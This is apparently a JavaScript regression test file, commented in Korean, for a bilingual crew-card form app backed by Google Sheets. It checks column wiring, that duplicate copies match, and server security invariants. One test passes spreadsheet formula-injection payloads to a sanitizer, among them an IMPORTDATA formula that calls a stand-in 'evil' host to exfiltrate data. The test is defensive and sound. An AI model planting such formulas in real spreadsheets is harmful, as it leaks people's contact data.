// 크루카드 웹앱 회귀 — 별도 프로젝트(crewcard/)와 카드 HTML의 배선이 갈라지는 것을 기계로 막는다.
// 지키는 것: ①컬럼 정본 ↔ 베이크된 data-column 정합 ②서빙본=문서본 동일 ③보안 불변식(hp·상한·doGet 무부작용)
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ROOT = path.resolve(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8');

const server = read('crewcard/크루카드.js');
const htmlKr = read('crewcard/카드_kr.html');
const htmlMn = read('crewcard/카드_mn.html');
const schema = JSON.parse(read('docs/크루카드/크루카드_스키마.json'));

const COLUMNS = (() => {
  const m = server.match(/const COLUMNS = \[([\s\S]*?)\];/);
  assert.ok(m, '크루카드.js에서 COLUMNS 리터럴을 찾지 못했다');
  return m[1].match(/'([^']+)'/g).map((s) => s.slice(1, -1));
})();

// data-column 실값만 (스크립트 문자열 템플릿 오염 방지 — [a-z0-9_]만 허용)
const htmlColumns = (html) =>
  new Set([...html.matchAll(/data-column="([a-z0-9_]+)"/g)].map((x) => x[1]));

test('COLUMNS 정본 — 크기·중복·머리 3열·Serial 열 위치', () => {
  assert.equal(COLUMNS.length, 182, 'COLUMNS가 182열이 아니다 — 스키마와 같이 바꿨는지 확인');
  assert.equal(new Set(COLUMNS).size, COLUMNS.length, '중복 컬럼');
  assert.deepEqual(COLUMNS.slice(0, 3), ['submitted_at', 'ref_serial', 'lang']);
  // 크루_다음번호_가 B열(2번째)을 ref_serial로 읽는다 — 열 순서를 바꾸면 채번이 눈이 먼다
  assert.equal(COLUMNS[1], 'ref_serial', 'ref_serial이 B열이 아니면 크루_다음번호_의 getRange(2,2,…)도 같이 고쳐야 한다');
});

test('스키마 ↔ COLUMNS — 모든 단일 컬럼 포함 + multi는 옵션 수만큼 전개', () => {
  for (const sec of schema.sections) {
    for (const f of sec.fields) {
      if (f.type === 'multi' && f.column_prefix) {
        const got = COLUMNS.filter((c) => c.startsWith(f.column_prefix + '_')).length;
        assert.ok(got >= f.options.length, `${f.field_id}: 옵션 ${f.options.length}개인데 컬럼 ${got}개`);
      } else if (f.column) {
        assert.ok(COLUMNS.includes(f.column), `스키마 컬럼 누락: ${f.column}`);
      }
    }
  }
});

test('베이크된 HTML ↔ COLUMNS — 양방향 정합 (KR·MN 동일)', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const hc = htmlColumns(html);
    const strays = [...hc].filter((c) => !COLUMNS.includes(c));
    assert.deepEqual(strays, [], `[${name}] HTML에만 있는 유령 컬럼`);
    const meta = new Set(['submitted_at', 'ref_serial', 'lang']);
    const missing = COLUMNS.filter((c) => !hc.has(c) && !meta.has(c));
    assert.deepEqual(missing, [], `[${name}] HTML에 바인딩이 없는 컬럼 — 제출해도 이 값은 영영 빈칸`);
    // 바인딩은 정적 베이크가 정본 — 런타임 라벨 매칭(몽골어에서 전멸)에 의존하면 회귀
    assert.ok((html.match(/data-field="/g) || []).length >= 320, `[${name}] 베이크 소실`);
  }
});

test('서빙본(crewcard/) = 문서본(docs/크루카드/) 바이트 동일 — 두 벌이 갈라지면 여기서 죽는다', () => {
  assert.equal(htmlKr, read('docs/크루카드/크루카드_한국어.html'), 'KR 두 벌이 다르다 — 한쪽만 고쳤다');
  assert.equal(htmlMn, read('docs/크루카드/크루카드_몽골어.html'), 'MN 두 벌이 다르다 — 한쪽만 고쳤다');
});

test('카드 HTML — 제출·자동저장·허니팟·퀴즈 배선', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    assert.ok(html.includes('id="synkHp"'), `[${name}] 허니팟 입력 없음`);
    assert.ok(html.includes("form:'crew_card'"), `[${name}] 제출 페이로드 form 식별자 없음`);
    assert.ok(html.includes('hp: (document.getElementById'), `[${name}] 허니팟이 페이로드에 안 실린다`);
    // 브라우저 기본값 의존을 없애는 명시화(08-04). ⚠ 이건 인코딩 버그의 수정이 아니다 —
    // 깨짐의 원인은 헤더가 아니라 Windows 셸의 CP949 인코딩이었고, 재실측으로 정정됐다.
    assert.ok(/'Content-Type':\s*'text\/plain;charset=UTF-8'/.test(html), `[${name}] 제출 fetch의 Content-Type 명시가 사라졌다`);
    assert.ok(!html.includes('크루카드_토큰') && !html.includes('SYNK_ENDPOINT.token'), `[${name}] 무토큰 결정 위반 — 클라이언트에 토큰 언급 잔재`);
    assert.ok(html.includes('quiz (.quiz-opts)'), `[${name}] 퀴즈 수집 패스 없음 — Q1~Q4가 시트에 안 간다`);
    assert.ok(html.includes('quiz single-select'), `[${name}] 퀴즈 단일선택 배선 없음`);
    assert.ok(html.includes("'synk.crewcard.v14'"), `[${name}] 자동저장 키가 v14가 아니다`);
    assert.ok(html.includes('reg_year_month='), `[${name}] fYear 보정(등록일 합성) 소실`);
    assert.ok(/@media \(max-width:760px\)/.test(html), `[${name}] 모바일 반응형 소실 — 원격(구글폼 겸용) 입구가 죽는다`);
  }
});

test('MN 전용 — Таны 키릴 서체(Cormorant) 배선', () => {
  // Fraunces·Gowun Batang·Playfair엔 Ө/Ү가 없다(구글폰트 unicode-range 실측 2026-08-04).
  // Cormorant cyrillic-ext = U+0460-052F가 U+04AE(Ү)·U+04E8(Ө)를 덮는다.
  assert.ok(htmlMn.includes('family=Cormorant'), 'MN 폰트 링크에 Cormorant가 없다');
  assert.ok(htmlMn.includes("font-family:'Cormorant','Fraunces'"), 'kc-t-kor 스택이 Cormorant 우선이 아니다');
});

test('서버 보안 불변식 — doGet 무부작용·hp 선차단·일일상한·락 채번', () => {
  const doGet = server.slice(server.indexOf('function doGet'), server.indexOf('function doPost'));
  for (const bad of ['appendRow', 'setProperty', 'insertSheet', 'deleteRow']) {
    assert.ok(!doGet.includes(bad), `doGet에 부작용(${bad}) — GET은 읽기 전용이어야 한다`);
  }
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  const order = ['body.form', 'body.hp', 'DAILY_CAP', 'waitLock', 'appendRow', 'releaseLock'];
  let prev = -1;
  for (const mark of order) {
    const cur = doPost.indexOf(mark);
    assert.ok(cur > prev, `doPost 순서 붕괴: ${order.join(' → ')} 중 ${mark}`);
    prev = cur;
  }
  assert.ok(doPost.includes("error: 'internal'"), '내부 오류를 밖으로 흘리지 않는 응답이 사라졌다');
  assert.ok(server.includes('MAX_CELL'), '셀 길이 상한 소실');
});

test('수식 인젝션 차단 — 셀안전_가 정본과 같고 실제로 막는다', () => {
  // 계기(08-04 적대 리뷰): 익명 POST 한 번으로 crew_cards에 라이브 수식이 착지하고, 같은
  // 스프레드시트의 상담 연락처가 IMPORTDATA로 빠져나갈 수 있었다. [v9.153] profiles와 같은 계열.
  const grab = (src) => {
    const m = src.match(/function 셀안전_\(v\)[\s\S]*?\n\}/);
    assert.ok(m, '셀안전_ 정의를 찾지 못했다');
    return m[0].replace(/\r\n/g, '\n');
  };
  const canon = grab(read('상담AI.js'));
  const local = grab(server);
  assert.equal(local, canon, 'crewcard 사본이 정본과 갈렸다 — 한쪽만 고치면 방어가 반쪽이 된다');

  // 문자열 존재가 아니라 동작으로 검사한다(가드는 「적용된 결과」를 본다)
  const body = local.slice(local.indexOf('{') + 1, local.lastIndexOf('}'));
  const 셀안전_ = new Function('v', body);
  ['=IMPORTDATA("https://evil/x")', '+1+1', '-1', '@SUM(A1)', '\tx', '\rx'].forEach((bad) => {
    assert.equal(셀안전_(bad), "'" + bad, `위험 접두를 못 막았다: ${JSON.stringify(bad)}`);
  });
  ['홍길동', 'Батбаяр', '010-1234-5678', '', 'a=b'].forEach((ok) => {
    assert.equal(셀안전_(ok), ok, `정상 값을 건드렸다: ${JSON.stringify(ok)}`);
  });
});

test('수식 인젝션 차단 — doPost의 시트 쓰기 경로가 전부 소독을 지난다', () => {
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  assert.ok(doPost.includes('return 셀안전_(String(v).slice(0, MAX_CELL))'),
    '사용자 입력이 소독 없이 appendRow로 간다 — 익명 수식 인젝션 재개통');
  assert.ok(doPost.includes('return 셀안전_(String(body.lang'), 'lang(요청 본문)이 소독을 안 지난다');
  assert.ok(!/return String\(v\)\.slice/.test(doPost), '소독 없는 원시 반환 경로가 남아 있다');
});

test('HtmlService 노출 표면 — 밑줄 없는 전역 함수는 doGet·doPost뿐', () => {
  // 이 프로젝트는 HtmlService를 반환하므로 google.script.run 표면이 곧 공격 표면이다.
  const fns = [...server.matchAll(/^function ([A-Za-z가-힣_][\w가-힣]*)\s*\(/gm)].map((m) => m[1]);
  const exposed = fns.filter((n) => !n.endsWith('_') && !['doGet', 'doPost'].includes(n));
  assert.deepEqual(exposed, [], `밑줄 종결이 아닌 전역 함수: ${exposed} — 익명자가 부를 수 있다`);
});
